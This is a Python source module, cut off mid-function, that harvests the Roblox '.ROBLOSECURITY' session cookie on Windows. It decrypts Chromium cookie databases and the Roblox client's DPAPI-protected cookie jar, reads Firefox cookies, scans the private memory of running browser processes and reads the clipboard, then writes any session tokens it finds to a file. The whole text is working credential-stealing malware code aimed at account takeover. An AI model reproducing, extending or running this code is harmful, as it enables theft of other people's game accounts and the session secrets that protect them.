"""The Roblox session cookie, from the cookie stores and from live memory.

``.ROBLOSECURITY`` is the whole account. There are three places it exists on a running
machine and they fail in different ways:

- **In a browser store.** Chromium keeps it in ``Network\\Cookies`` wrapped with DPAPI
  plus AES-256-GCM; Firefox keeps it in ``moz_cookies`` in the clear. A profile that has
  not been opened since the cookie was set still has it. A store being written to right
  now may refuse the copy.
- **In the Roblox client jar.** The desktop app keeps its own cookie file at
  ``%LOCALAPPDATA%\\Roblox\\LocalStorage\\RobloxCookies.dat``: JSON, whose ``CookiesData``
  is base64 over a DPAPI blob that decrypts to a Netscape cookie file. A signed-in client
  that has never opened a browser is a session that lives nowhere else.
- **In memory.** A browser that is running has already decrypted it and holds the
  plaintext for the life of the session. This also covers the case the database cannot:
  a store that will not copy, or a profile the current user cannot open.

All three are read, disk first because it is cheap and deterministic, then memory for
whatever is live. Every hit is deduplicated on the value, because the same cookie is
normally in more than one place.

The store read is domain-scoped on purpose. Asking a cookie table for its newest N rows
and then filtering in Python answers "what did this browser touch most recently", which
is not the same question as "is there a roblox session in here": a machine that has not
opened roblox.com for a few weeks keeps the cookie while a thousand other rows sort
ahead of it. The domain clause is what makes the read independent of recency.

Nothing here is trusted to be well-formed. A value has to look like a Roblox session
cookie before it is written: the modern ones carry a fixed warning prefix, and a legacy
one is a long run of base64-ish characters. A run that finds nothing writes no file and
says, per profile, which kind of nothing it was in ``roblox_status.json``.
"""

from __future__ import annotations

import base64
import ctypes
import hashlib
import json
import os
import re
import time
from pathlib import Path
from typing import Any, Final

from .. import log, util, winapi
from . import browsers
from .browsers import chromium

COOKIE_NAME: Final[str] = ".ROBLOSECURITY"
STATUS_FILE: Final[str] = "roblox_status.json"
SESSION_FILE: Final[str] = "roblox_session.txt"

# The desktop client's own jar. Same cookie, different container: a signed-in client on a
# machine whose browsers were never used for roblox.com holds the only copy here.
_CLIENT_JARS: Final[tuple[tuple[str, str], ...]] = (
    ("roblox-client", r"Roblox\LocalStorage\RobloxCookies.dat"),
)
# The DPAPI blob is behind base64 behind JSON. Anything larger is not this file.
_MAX_JAR_BYTES: Final[int] = 256 * 1024
_MAX_PLAIN_BYTES: Final[int] = 1024 * 1024

# The prefix every cookie minted since 2019 carries. It is the strongest signal in a
# memory image: 20 bytes that do not occur by accident.
_WARNING: Final[str] = "WARNING:-DO-NOT-SHARE"
_WARNING_BYTES: Final[bytes] = b"_|WARNING:-DO-NOT-SHARE"

# A cookie body is long. Sixty is below every real one and above every random run of
# characters that survives the printable filter.
_MIN_BODY: Final[int] = 60
# Above every body observed, including the longest current ones, because a cap below the
# real length does not fail loudly: it writes a truncated cookie that looks like a
# session and is not one.
_MAX_TOKEN: Final[int] = 4096
_MAX_TOKENS: Final[int] = 8
# A body that repeats one character is a redaction, a placeholder or a test vector.
# Nothing the vendor mints looks like that, and a run of it is what a page quoting a
# cookie looks like, so this is the line between a session and a string about one.
_MIN_DISTINCT: Final[int] = 16

# Roblox cookies live under "roblox.com", ".roblox.com" and its subdomains. LIKE on the
# host is the SQL form of the domain filter the browser API gives an extension.
_DOMAIN: Final[str] = "%roblox.com"
_MAX_ROWS: Final[int] = 200

_BODY: Final[re.Pattern[str]] = re.compile(r"[A-Za-z0-9+/=_|.:\-]+")
_PRINTABLE: Final[re.Pattern[bytes]] = re.compile(
    rb"[A-Za-z0-9+/=_|.:\-]{%d,%d}" % (_MIN_BODY, _MAX_TOKEN)
)
# A cookie header, a request line, or a store dump puts the name immediately before the
# value. This is the shape used when the body itself carries no warning prefix.
_NAME_ANCHOR: Final[re.Pattern[bytes]] = re.compile(
    rb"\.?ROBLOSECURITY\s*=\s*([A-Za-z0-9+/=_|.:\-]{%d,%d})" % (_MIN_BODY, _MAX_TOKEN),
    re.IGNORECASE,
)

# What a profile record can say. Enumerated, not free text: after a run in the field the
# question is always "which kind of nothing was this", and a sentence cannot be counted.
REASONS: Final[frozenset[str]] = frozenset(
    {
        "ok",
        "no_store",
        "copy_refused",
        "no_row",
        "empty",
        "key_missing",
        "tag_failed",
        "rejected_shape",
        "no_client",
        "dpapi_failed",
        "decode_failed",
        # The jar decrypted but the plaintext was not a cookie file this reader knows:
        # a container it cannot name, a value cut off mid-write, or a file that only ever
        # held the client's tracking cookies. Three different findings, three words.
        "wrapper_unknown",
        "truncated",
        "tracker_only",
    }
)

# Cookies the client writes to the same domain as the session and never replaces it with.
# A jar holding only these is a signed-out client, which is a fact worth reporting rather
# than a shape failure on a row that was never a session.
_TRACKER_NAMES: Final[frozenset[str]] = frozenset(
    {"guestdata", "rbxeventtrackerv2", "rbxsessiontracker", "rbxuid"}
)

# --- memory scan bounds -------------------------------------------------------
# A browser is a few hundred megabytes of committed pages and most of them are image or
# shared. The scan is capped four ways so a machine under load cannot turn a two-minute
# run into a ten-minute one: private pages only, bytes per process, seconds of wall clock
# for the whole phase, and processes per image name.
#
# Private-only is the change that matters. Measured on a desk with forty-two browser
# processes, the readable surface was 3.9 GB of committed pages and 0.4 GB of it private;
# the image and mapped sections are the browser's own code and files on disk, and no
# decrypted cookie is ever in them. Reading everything cost 12-16 s per process and found
# nothing inside the thirty-second budget. Reading private pages only costs 0.8-30 MB per
# process and finds the same cookie in about eleven seconds for the whole set.
_PROCESS_NAMES: Final[tuple[str, ...]] = ("chrome.exe", "msedge.exe", "brave.exe", "firefox.exe")
_MAX_PROCESSES: Final[int] = 64
_CHUNK: Final[int] = 4 * 1024 * 1024
_MAX_PER_PROCESS: Final[int] = 256 * 1024 * 1024
_SCAN_SECONDS: Final[float] = 75.0
# MEM_PRIVATE. An image section holds executable code and a mapped section holds a file;
# neither can hold a value the browser decrypted into its heap.
_MEM_PRIVATE: Final[int] = 0x20000


def _is_roblox(name: str) -> bool:
    """True for ``.ROBLOSECURITY`` however a store spelled it.

    Stores differ on the leading dot, on case, and on whitespace. The dot is a domain
    attribute in the cookie grammar, not part of the name, so it is the first thing
    stripped. ``RBXSessionTracker`` is a correlation id, not a session, and is
    deliberately not matched.
    """
    return name.strip().lstrip(".").lower() == COOKIE_NAME.lstrip(".").lower()


def _is_tracker(name: str) -> bool:
    """True for the client's own tracking cookies, which share the session's domain.

    ``RBXEventTrackerV2`` carries a ``CreateDate=...&rbxuid=...`` value. It is on
    ``.roblox.com`` and it is the row a mis-split reader picks up first, because it is the
    last record in the file and its value has no ``;`` terminator.
    """
    return name.strip().lstrip(".").lower() in _TRACKER_NAMES


def _plausible(value: str) -> bool:
    """True when a string could be a session body rather than text about one."""
    if not _MIN_BODY <= len(value) <= _MAX_TOKEN:
        return False
    if _BODY.fullmatch(value) is None:
        return False
    return len(set(value)) >= _MIN_DISTINCT


def _looks_truncated(value: str) -> bool:
    """True when a short value is a cut-off cookie rather than a different kind of value.

    The client writes the jar by rewriting it in place. A run interrupted mid-write leaves
    a value that starts with the warning prefix and stops before the body does — that is a
    truncated session, and reporting it as a bad shape sends the reader looking at the
    parser instead of at the file.
    """
    if not value or len(value) >= _MIN_BODY:
        return False
    return _WARNING_BYTES.decode("ascii").startswith(value)


def _prefix(blob: Any) -> str:
    """Cipher generation of an encrypted row, for the per-profile record."""
    if not isinstance(blob, (bytes, bytearray)) or not blob:
        return "plain"
    head = bytes(blob)[:3]
    if head in (b"v10", b"v11", b"v20"):
        return head.decode("ascii")
    return "other"


def _harvest(block: bytes) -> list[bytes]:
    """Cookie-shaped strings in one block.

    Two anchors, both narrow. The warning prefix is the primary: 20 bytes that do not
    occur by accident, which is what every cookie minted since 2019 carries. The name
    anchor covers a body that predates the prefix or was written without it, and it
    requires a run of distinct characters so a page quoting the name followed by a
    placeholder is not mistaken for a session.

    Earlier attempts matched "a long cookie-shaped run near the name" without either
    gate and returned the surrounding tab's text and other sites' cookies. An empty
    file is better than a misleading one.
    """
    found: list[bytes] = []

    for match in re.finditer(re.escape(_WARNING_BYTES), block):
        tail = block[match.start() : match.start() + _MAX_TOKEN]
        run = _PRINTABLE.match(tail)
        if run and len(run.group()) >= _MIN_BODY:
            found.append(run.group())

    for match in _NAME_ANCHOR.finditer(block):
        body = match.group(1)
        if len(set(body)) >= _MIN_DISTINCT:
            found.append(body)

    unique: list[bytes] = []
    for value in found:
        if value not in unique:
            unique.append(value)
    return unique


def _scan_process(pid: int, deadline: float) -> tuple[list[bytes], int]:
    """Tokens found in one process, and how many bytes were read."""
    tokens: list[bytes] = []
    read_total = 0
    # The buffer is one chunk plus one token, because a cookie can straddle a chunk
    # boundary. Reading chunk-sized and starting each read at zero cuts a 900-byte value
    # in half roughly once per boundary and the scan reports a session that is not there.
    buffer = ctypes.create_string_buffer(_CHUNK + _MAX_TOKEN)

    with winapi.RemoteProcess(pid) as remote:
        if not remote:
            return [], 0

        for base, size, kind in remote.regions_with_type():
            if kind != _MEM_PRIVATE:
                continue
            if time.monotonic() > deadline or read_total >= _MAX_PER_PROCESS:
                break
            if len(tokens) >= _MAX_TOKENS:
                break

            carry = 0
            offset = 0
            while offset < size:
                if time.monotonic() > deadline or read_total >= _MAX_PER_PROCESS:
                    break
                span = min(_CHUNK, size - offset)
                target = ctypes.addressof(buffer) + carry
                amount = remote.read_into(base + offset, ctypes.c_void_p(target), span)
                if amount <= 0:
                    # One unreadable page ends the region, not the process: the next
                    # VirtualQueryEx call picks up after it.
                    break
                read_total += amount
                window = buffer.raw[: carry + amount]
                for token in _harvest(window):
                    if token not in tokens:
                        tokens.append(token)
                keep = min(_MAX_TOKEN, carry + amount)
                ctypes.memmove(buffer, window[-keep:], keep)
                carry = keep
                if amount < span:
                    break
                offset += amount

    return tokens, read_total


def _memory_tokens() -> tuple[list[str], dict[str, Any]]:
    detail: dict[str, Any] = {"processes": 0, "scanned": 0, "found": 0, "reason": ""}

    wanted = {name.lower() for name in _PROCESS_NAMES}
    targets = [(pid, name) for pid, name in winapi.process_list() if name.lower() in wanted]
    if not targets:
        detail["reason"] = "no browser process running"
        return [], detail

    # A browser is forty processes and the token sits in one of them. Smallest private
    # commit first, because the cookie jar lives in the network service and the renderers
    # that carry a session are small — the multi-gigabyte renderer carrying the tab the
    # operator is looking at is the least likely of the forty and the most expensive to
    # read. The time budget, not the list, is what ends the scan.
    def weight(item: tuple[int, str]) -> tuple[bool, int]:
        size = winapi.process_private_bytes(item[0])
        return (size is None, size or 0)

    targets.sort(key=weight)
    detail["candidates"] = len(targets)

    tokens: list[str] = []
    deadline = time.monotonic() + _SCAN_SECONDS
    seen_pids: set[int] = set()
    counted = 0

    for pid, name in targets:
        if counted >= _MAX_PROCESSES or time.monotonic() > deadline:
            break
        if pid in seen_pids:
            continue
        seen_pids.add(pid)
        counted += 1
        found, read = _scan_process(pid, deadline)
        detail["scanned"] += read
        log.logger.debug("roblox: %s pid %d read %d bytes, %d hit(s)", name, pid, read, len(found))
        for raw in found:
            text = raw.decode("ascii", "replace")
            if text not in tokens:
                tokens.append(text)

    detail["processes"] = counted
    detail["found"] = len(tokens)
    if not tokens:
        detail["reason"] = f"{counted} process(es) scanned, no cookie"
    return tokens, detail


# --- cookie stores ------------------------------------------------------------


def _open_row(row: dict[str, Any], keys: Any) -> tuple[str, str]:
    """Plaintext of one cookie row, and the reason when there is none.

    Chromium leaves ``value`` empty on an encrypted row, so an empty result is not
    evidence that the row is empty. The failure is classified from the cipher
    generation: a ``v20`` row needs the app-bound key, and its absence is a different
    finding from a key that was present and did not open the row.
    """
    host = chromium.text_value(row.get("host_key"))
    binding = hashlib.sha256(host.encode("utf-8")).digest()
    blob = row.get("encrypted_value")
    generation = _prefix(blob)

    if keys is not None:
        try:
            secret = chromium.secret_value(blob, keys, binding)
        except Exception:
            log.logger.debug("roblox: row open raised", exc_info=True)
            secret = None
        if secret is not None:
            return (secret.decode("utf-8", "replace").strip(), "")

    plain = chromium.text_value(row.get("value")).strip()
    if plain:
        return (plain, "")

    if generation == "v20":
        if keys is None or getattr(keys, "app_bound", None) is None:
            return ("", "key_missing")
        return ("", "tag_failed")
    if generation in ("v10", "v11"):
        if keys is None or getattr(keys, "user", None) is None:
            return ("", "key_missing")
        return ("", "tag_failed")
    return ("", "tag_failed")


def _select(candidates: list[dict[str, Any]]) -> list[str]:
    """Values that are sessions, value-marker pass first, normalised name second.

    The reference implementation matches the body rather than the name, because the body
    is the part that cannot be renamed while the name has been spelled at least three
    ways in the wild. The name pass exists for the plaintext row whose body predates the
    marker.
    """
    picked: list[str] = []
    for entry in candidates:
        value = entry["value"]
        if entry["failure"] or not _plausible(value):
            continue
        if _WARNING in value:
            picked.append(value)
    if picked:
        return picked

    for entry in candidates:
        value = entry["value"]
        if entry["failure"] or not _plausible(value):
            continue
        if _is_roblox(entry["name"]):
            picked.append(value)
    return picked


def _why(candidates: list[dict[str, Any]], record: dict[str, Any]) -> tuple[str, str]:
    """(reason, detail) for a profile that produced no session."""
    for want in ("key_missing", "tag_failed"):
        for entry in candidates:
            if entry["failure"] == want:
                if want == "key_missing":
                    return (
                        "key_missing",
                        f"{entry['prefix']} row, no app-bound key unwrapped for this profile",
                    )
                return ("tag_failed", f"{entry['prefix']} row, key present but did not open it")

    for entry in candidates:
        if entry["failure"] == "truncated":
            head = entry["value"][:8]
            return (
                "truncated",
                f"opened {entry['length']} bytes, a cut-off value (head {head!r})",
            )

    for entry in candidates:
        if entry["failure"] == "rejected_shape":
            head = entry["value"][:8]
            return (
                "rejected_shape",
                f"opened {entry['length']} bytes, not a session shape (head {head!r})",
            )

    if record["named"]:
        return ("empty", f"{record['named']} named row(s), none opened")
    return ("empty", f"{record['rows']} roblox row(s), none named {COOKIE_NAME}")


def _record(root_name: str, profile: Path) -> dict[str, Any]:
    return {
        "profile": f"{root_name}/{profile.name}",
        "store": "",
        "wal_bytes": 0,
        "rows": 0,
        "named": 0,
        "prefixes": {},
        "opened": 0,
        "found": 0,
        "reason": "no_store",
        "detail": "",
    }


def _chromium_profile(root_name: str, profile: Path, tokens: list[str]) -> dict[str, Any]:
    record = _record(root_name, profile)

    source: Path | None = None
    for relative in (Path("Network") / "Cookies", Path("Cookies")):
        try:
            candidate = profile / relative
            if candidate.is_file():
                source = candidate
                record["store"] = relative.as_posix()
                break
        except OSError:
            continue
    if source is None:
        return record

    try:
        record["wal_bytes"] = chromium.wal_bytes(source)
    except OSError:
        record["wal_bytes"] = 0

    try:
        keys = chromium.profile_keys(profile)
    except Exception:
        log.logger.debug("roblox: no keys for %s", profile, exc_info=True)
        keys = None

    with util.temp_workspace("sable-roblox-") as scratch:
        copy = chromium.copy_database(source, scratch)
        if copy is None:
            record["reason"] = "copy_refused"
            return record
        rows = chromium.read_table(
            copy,
            "cookies",
            ("host_key", "name", "value", "encrypted_value"),
            _MAX_ROWS,
            "last_access_utc DESC",
            where="host_key LIKE ?",
            params=(_DOMAIN,),
        )

    record["rows"] = len(rows)
    if not rows:
        record["reason"] = "no_row"
        record["detail"] = f"no cookie row for {_DOMAIN}"
        return record

    candidates: list[dict[str, Any]] = []
    for row in rows:
        name = chromium.text_value(row.get("name"))
        generation = _prefix(row.get("encrypted_value"))
        if _is_roblox(name):
            record["named"] += 1
            record["prefixes"][generation] = record["prefixes"].get(generation, 0) + 1

        value, failure = _open_row(row, keys)
        if value:
            record["opened"] += 1
            if not failure and not _plausible(value):
                failure = "rejected_shape"
        candidates.append(
            {
                "name": name,
                "prefix": generation,
                "value": value,
                "failure": failure,
                "length": len(value),
            }
        )

    picked = _select(candidates)
    record["found"] = len(picked)
    if picked:
        record["reason"] = "ok"
        for value in picked:
            if value not in tokens:
                tokens.append(value)
        return record

    record["reason"], record["detail"] = _why(candidates, record)
    return record


def _gecko_profile(profile: Path, tokens: list[str]) -> dict[str, Any]:
    record = _record("firefox", profile)
    source = profile / "cookies.sqlite"
    try:
        if not source.is_file():
            return record
    except OSError:
        return record

    record["store"] = source.name
    try:
        record["wal_bytes"] = chromium.wal_bytes(source)
    except OSError:
        record["wal_bytes"] = 0

    with util.temp_workspace("sable-roblox-") as scratch:
        copy = chromium.copy_database(source, scratch)
        if copy is None:
            record["reason"] = "copy_refused"
            return record
        rows = chromium.read_table(
            copy,
            "moz_cookies",
            ("host", "name", "value"),
            _MAX_ROWS,
            "lastAccessed DESC",
            where="host LIKE ?",
            params=(_DOMAIN,),
        )

    record["rows"] = len(rows)
    if not rows:
        record["reason"] = "no_row"
        record["detail"] = f"no cookie row for {_DOMAIN}"
        return record

    candidates: list[dict[str, Any]] = []
    for row in rows:
        name = chromium.text_value(row.get("name"))
        if _is_roblox(name):
            record["named"] += 1
            record["prefixes"]["plain"] = record["prefixes"].get("plain", 0) + 1

        value = chromium.text_value(row.get("value")).strip()
        if value:
            record["opened"] += 1
        failure = ""
        if value and not _plausible(value):
            failure = "rejected_shape"
        candidates.append(
            {
                "name": name,
                "prefix": "plain",
                "value": value,
                "failure": failure,
                "length": len(value),
            }
        )

    picked = _select(candidates)
    record["found"] = len(picked)
    if picked:
        record["reason"] = "ok"
        for value in picked:
            if value not in tokens:
                tokens.append(value)
        return record

    record["reason"], record["detail"] = _why(candidates, record)
    return record


# Where one record ends and the next begins. The client's writer uses four different
# separators across its own versions and does not document any of them:
#   - a newline, the only one a naive reader handles;
#   - a space before the next ``#HttpOnly_``, which a newline-only reader turns into one
#     enormous row whose value carries the next record's domain;
#   - a ``;`` with no space before it, which is what a jar rewritten in place leaves;
#   - a ``;`` before a bare ``.roblox.com\t`` — the ``#HttpOnly_`` prefix dropped.
# All four are one pattern. Splitting on ``;`` alone would cut cookie values, which end in
# base64 and may contain ``;`` only when quoted, so each alternative is anchored on the
# field structure of the *next* record rather than on the separator.
_RECORD_BREAK: Final[re.Pattern[str]] = re.compile(
    r"\r?\n|\r|(?:\s+|;)(?=#HttpOnly_)|;(?=(?:#HttpOnly_)?\.?[A-Za-z0-9.-]*roblox\.com\t)",
    re.IGNORECASE,
)
_HTTPONLY: Final[str] = "#HttpOnly_"


def _strip_quotes(value: str) -> str:
    """A cookie value without the writer's quoting and record terminator."""
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        value = value[1:-1]
    return value.rstrip("; \t")


def _netscape_rows(text: str) -> list[dict[str, str]]:
    """Cookie rows out of a Netscape cookie file, in every spelling the client uses.

    Seven tab-separated fields: domain, include-subdomains, path, secure, expires, name,
    value. Five things about this format bite a naive reader:

    - ``#HttpOnly_`` is a prefix on the *domain* field, not a comment. A parser that drops
      every ``#`` line loses the session cookies, which are exactly the httponly ones.
    - Records are separated by a newline, by a space before ``#HttpOnly_``, by ``;``
      before it, or by ``;`` before a bare domain. A reader that only splits on newlines
      sees one enormous row and reads a value carrying the next record's domain.
    - Each value ends with ``;`` that is not part of it.
    - The name is not always field six. A value written with a tab in it pushes the name
      one field left, and the row then reads the *next* record's domain as its name.
    - The last record in the file has no terminator at all, which is why the tracker row
      is the one a misaligned reader reports as a bad session.

    Records are counted after the split and the name is located by walking the candidate
    fields, so a row that is short or shifted is skipped rather than indexed blindly.
    """
    rows: list[dict[str, str]] = []
    for chunk in _RECORD_BREAK.split(text):
        line = chunk.strip(" \r\n")
        if not line:
            continue
        # A record whose value is empty ends on a tab. Stripping tabs removes the only
        # field that marks the value, and the row then counts six fields and is skipped —
        # which is how a signed-out jar ends up reporting a shape failure on the tracker
        # that followed it instead of on the session row that had nothing in it.
        line = line.lstrip("\t")
        if not line:
            continue
        if line.startswith(_HTTPONLY):
            line = line[len(_HTTPONLY) :]
        elif line.startswith("#HttpOnly "):
            line = line[len("#HttpOnly ") :]
        elif line.startswith("#"):
            # "# Netscape HTTP Cookie File", "#Domain", and every other comment.
            continue

        fields = line.split("\t")
        if len(fields) < 7:
            continue

        # Field six is the name in a well-formed row. Walk a small window around it so a
        # row whose domain or path carried a tab still finds the name instead of reading
        # the following record's domain as it.
        index = 5
        for probe in (5, 4, 6):
            if 0 <= probe < len(fields) - 1 and _is_roblox(fields[probe]):
                index = probe
                break

        # Join the tail rather than taking one field: a value with a tab in it must not be
        # cut short, because a truncated cookie is written out as a session and is not one.
        value = _strip_quotes("\t".join(fields[index + 1 :]))
        rows.append(
            {
                "domain": fields[0].strip().lstrip("#").strip(),
                "name": fields[index].strip(),
                "value": value,
            }
        )
    return rows


def _jar_text(plain: bytes) -> str:
    """The jar's plaintext as text, whatever encoding the client wrote it in.

    UTF-8 with a BOM, UTF-16 with a BOM, and UTF-16 without one are all in the wild. The
    NUL test is the one that matters: a UTF-16 file decoded as UTF-8 "replace" reads as
    text with a NUL between every character, and every field then fails the shape check
    for a reason that names the wrong thing.
    """
    if plain.startswith((b"\xff\xfe", b"\xfe\xff")):
        try:
            return plain.decode("utf-16")
        except UnicodeDecodeError:
            pass
    body = plain[3:] if plain.startswith(b"\xef\xbb\xbf") else plain
    if body and body.count(b"\x00") > len(body) // 4:
        return body.decode("utf-16-le", "replace")
    return body.decode("utf-8", "replace")


def _jar_kind(text: str) -> str:
    """A word for what the plaintext actually is, for the record when nothing is found."""
    head = text.lstrip()[:1]
    if head in ("{", "["):
        return "json"
    if "\t" in text or _HTTPONLY in text or "ROBLOSECURITY" in text:
        return "netscape"
    if len(text.strip()) < _MIN_BODY:
        return "short"
    return "text"


def _nested_plain(text: str) -> bytes | None:
    """One more unwrap when the decrypted payload is itself a wrapper.

    The container changed once already (a JSON field holding base64 holding a DPAPI blob).
    If it changes again, the payload will be a JSON object whose field holds the next
    layer, and the reader should follow it once rather than report a shape failure. One
    level only: a loop over untrusted wrappers is a way to spend the run's budget on a
    file that lies about its own structure.
    """
    try:
        document = json.loads(text)
    except ValueError:
        return None
    if not isinstance(document, dict):
        return None
    for value in document.values():
        if not isinstance(value, str) or not value:
            continue
        try:
            candidate = base64.b64decode(value, validate=False)
        except Exception:  # b64decode raises binascii.Error, a ValueError subclass
            continue
        if not candidate:
            continue
        opened = winapi.crypt_unprotect(candidate)
        if opened:
            return opened
    return None


def _jar_open(path: Path) -> tuple[bytes | None, list[dict[str, str]], str, str]:
    """(plaintext, rows, reason, detail) for one client jar. Never raises.

    The plaintext comes back even when no row was found, because the caller harvests it:
    a decrypted payload is trusted material and the same two anchors the memory scan uses
    find a session inside any container the row reader does not recognise.
    """
    try:
        size = path.stat().st_size
    except OSError:
        return (None, [], "no_client", "not readable")
    if size <= 0 or size > _MAX_JAR_BYTES:
        return (None, [], "decode_failed", f"jar is {size} bytes")

    try:
        raw = path.read_bytes()
    except OSError as exc:
        return (None, [], "no_client", f"{type(exc).__name__} reading jar")

    try:
        document = json.loads(raw.decode("utf-8", "replace"))
    except ValueError:
        return (None, [], "decode_failed", "jar is not JSON")
    if not isinstance(document, dict):
        return (None, [], "decode_failed", "jar JSON is not an object")

    payload = document.get("CookiesData")
    if not isinstance(payload, str) or not payload:
        return (None, [], "decode_failed", "no CookiesData field")

    try:
        sealed = base64.b64decode(payload, validate=False)
    except Exception:  # b64decode raises binascii.Error, a ValueError subclass
        return (None, [], "decode_failed", "CookiesData is not base64")
    if not sealed:
        return (None, [], "decode_failed", "CookiesData decoded to nothing")

    plain = winapi.crypt_unprotect(sealed)
    if plain is None:
        return (None, [], "dpapi_failed", f"DPAPI refused {len(sealed)} bytes")
    if not plain or len(plain) > _MAX_PLAIN_BYTES:
        return (None, [], "decode_failed", f"plaintext is {len(plain)} bytes")

    text = _jar_text(plain)
    rows = _netscape_rows(text)
    if not rows:
        nested = _nested_plain(text)
        if nested is not None:
            plain = nested
            text = _jar_text(nested)
            rows = _netscape_rows(text)
        if not rows:
            kind = _jar_kind(text)
            reason = "truncated" if kind == "short" else "wrapper_unknown"
            detail = f"{len(plain)} bytes of {kind} plaintext, no cookie row"
            return (plain, [], reason, detail)
    return (plain, rows, "", "")


def _jar_rows(path: Path) -> tuple[list[dict[str, str]], str, str]:
    """(rows, reason, detail) for one client jar. The reader's row pass alone."""
    _plain, rows, reason, detail = _jar_open(path)
    return (rows, reason, detail)


def _client_tokens() -> tuple[list[str], dict[str, Any]]:
    """Sessions out of the Roblox client's own cookie jar."""
    tokens: list[str] = []
    records: list[dict[str, Any]] = []

    local = os.environ.get("LOCALAPPDATA", "")
    base = Path(local) if local else None

    for name, relative in _CLIENT_JARS:
        record = _record(name, Path(relative).parent)
        record["profile"] = name
        record["store"] = Path(relative).name
        # Rows the row-reader could not place but the harvest pass found. Kept as its own
        # counter because "the jar worked" and "the jar's container was not recognised but
        # the value was in there" are different findings about the client's writer.
        record["harvest"] = 0
        records.append(record)
        if base is None:
            record["detail"] = "no LOCALAPPDATA"
            continue

        path = base / relative
        if not path.is_file():
            record["detail"] = f"no jar at {relative}"
            continue

        try:
            record["wal_bytes"] = path.stat().st_size
            plain, rows, reason, detail = _jar_open(path)
        except Exception:  # one jar must not cost the other stores
            log.logger.debug("roblox: client jar failed: %s", path, exc_info=True)
            record["reason"] = "decode_failed"
            record["detail"] = "reader raised"
            continue

        if reason and plain is None:
            record["reason"] = reason
            record["detail"] = detail
            continue

        record["rows"] = len(rows)
        candidates: list[dict[str, Any]] = []
        for row in rows:
            if "roblox" not in row["domain"].lower():
                continue
            record["opened"] += 1
            named = _is_roblox(row["name"])
            if named:
                record["named"] += 1
                record["prefixes"]["jar"] = record["prefixes"].get("jar", 0) + 1
            elif _is_tracker(row["name"]):
                record["prefixes"]["tracker"] = record["prefixes"].get("tracker", 0) + 1
            failure = ""
            if not _plausible(row["value"]):
                # A named row with nothing after the tab is the client's signed-out shape:
                # the name stays, the value is wiped. That is a fact about the jar, and it
                # is worth a different word than a tracker row that never held a session.
                if named and (not row["value"] or _looks_truncated(row["value"])):
                    failure = "truncated"
                else:
                    failure = "rejected_shape"
            candidates.append(
                {
                    "name": row["name"],
                    "prefix": "jar",
                    "value": row["value"],
                    "failure": failure,
                    "length": len(row["value"]),
                }
            )

        # The plaintext is already decrypted and trusted, so the row reader is not the only
        # way in. The two anchors are the ones the memory scan uses, which means a client
        # build that changes its container again is still read: the value is in the bytes
        # whether or not the file is a cookie file this reader names.
        if plain:
            seen = {entry["value"] for entry in candidates}
            for raw in _harvest(plain):
                value = raw.decode("ascii", "replace").strip()
                if not value or value in seen or not _plausible(value):
                    continue
                seen.add(value)
                record["harvest"] += 1
                candidates.append(
                    {
                        "name": COOKIE_NAME,
                        "prefix": "jar",
                        "value": value,
                        "failure": "",
                        "length": len(value),
                    }
                )

        if not candidates:
            if reason:
                record["reason"] = reason
                record["detail"] = detail
            elif record["prefixes"].get("tracker"):
                record["reason"] = "tracker_only"
                record["detail"] = "jar holds tracker cookies only, no .ROBLOSECURITY row"
            else:
                record["reason"] = "no_row"
                record["detail"] = "jar holds no roblox row"
            continue

        picked = _select(candidates)
        record["found"] = len(picked)
        if picked:
            record["reason"] = "ok"
            for value in picked:
                if value not in tokens:
                    tokens.append(value)
            continue

        # A row set that never contained the session is not a shape failure on one of its
        # rows. The client writes GuestData and RBXEventTrackerV2 to the same domain on
        # every run, and a signed-out jar holds exactly those.
        if all(_is_tracker(entry["name"]) for entry in candidates):
            record["reason"] = "tracker_only"
            record["detail"] = "jar holds tracker cookies only, no .ROBLOSECURITY row"
            continue

        record["reason"], record["detail"] = _why(candidates, record)

    detail: dict[str, Any] = {
        "jars": len(records),
        "found": len(tokens),
        "reasons": _summary(records),
        "records": records,
        "reason": "",
    }
    if not tokens:
        detail["reason"] = _first_reason(records)
    return tokens, detail


def _clipboard_tokens() -> tuple[list[str], dict[str, Any]]:
    """Sessions sitting in the clipboard.

    Copying a request out of DevTools ("copy as PowerShell", "copy as cURL") puts the
    ``Cookie:`` header, and with it ``.ROBLOSECURITY``, on the clipboard in plaintext. That
    is a real second copy of the value, and on a machine whose browser store refuses every
    open it is sometimes the only one an operator can hand over. One read, always bounded.
    """
    detail: dict[str, Any] = {"read": 0, "found": 0, "reason": ""}

    text = winapi.clipboard_text()
    if not text:
        detail["reason"] = "clipboard empty or held by another process"
        return [], detail

    detail["read"] = len(text)
    tokens: list[str] = []
    for raw in _harvest(text.encode("utf-8", "replace")):
        value = raw.decode("ascii", "replace").strip()
        if not value or not _plausible(value):
            continue
        if value not in tokens:
            tokens.append(value)

    detail["found"] = len(tokens)
    if not tokens:
        detail["reason"] = f"{len(text)} chars on the clipboard, no session"
    return tokens, detail


def _summary(records: list[dict[str, Any]]) -> dict[str, int]:
    counts: dict[str, int] = {}
    for record in records:
        reason = str(record.get("reason") or "empty")
        counts[reason] = counts.get(reason, 0) + 1
    return counts


def _chromium_tokens() -> tuple[list[str], dict[str, Any]]:
    tokens: list[str] = []
    records: list[dict[str, Any]] = []

    for root in browsers.chromium_roots():
        try:
            if not root.path.is_dir():
                continue
        except OSError:
            continue

        profiles = [root.path] if root.profile_is_root else browsers.profile_dirs(root.path)
        for profile in profiles:
            try:
                records.append(_chromium_profile(root.name, profile, tokens))
            except Exception:
                # A single unreadable profile must not cost the other twenty.
                log.logger.debug("roblox: profile read failed: %s", profile, exc_info=True)

    detail: dict[str, Any] = {
        "profiles": len(records),
        "found": len(tokens),
        "reasons": _summary(records),
        "records": records,
        "reason": "",
    }
    if not tokens:
        detail["reason"] = "no .ROBLOSECURITY row" if not records else _first_reason(records)
    return tokens, detail


def _first_reason(records: list[dict[str, Any]]) -> str:
    """One line for the whole method, chosen from the per-profile records."""
    for want in (
        "key_missing",
        "tag_failed",
        "dpapi_failed",
        "decode_failed",
        "truncated",
        "wrapper_unknown",
        "tracker_only",
        "rejected_shape",
        "copy_refused",
        "empty",
        "no_row",
        "no_client",
    ):
        if any(record.get("reason") == want for record in records):
            return want
    return "no_row"


def _gecko_tokens() -> tuple[list[str], dict[str, Any]]:
    tokens: list[str] = []
    records: list[dict[str, Any]] = []

    for root in browsers.gecko_roots():
        try:
            if not root.path.is_dir():
                continue
        except OSError:
            continue
        for profile in browsers.firefox_profiles(root.path):
            try:
                records.append(_gecko_profile(profile, tokens))
            except Exception:
